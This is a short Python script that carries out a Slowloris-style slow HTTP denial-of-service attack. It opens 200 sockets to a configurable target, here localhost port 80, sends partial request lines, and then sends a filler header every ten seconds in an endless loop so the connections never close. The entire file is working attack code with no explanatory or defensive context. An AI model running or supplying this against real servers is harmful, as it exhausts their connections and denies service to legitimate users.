import socket
import time

TARGET = "127.0.0.1"
PORT = 80

print("[+] Starting Slow Attack")

sockets = []

for _ in range(200):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, PORT))
    s.send(b"GET / HTTP/1.1\r\n")
    sockets.append(s)

while True:
    for s in sockets:
        try:
            s.send(b"X-a: b\r\n")
        except Exception as e:
            print(f"Error: {e}")
            pass

    time.sleep(10)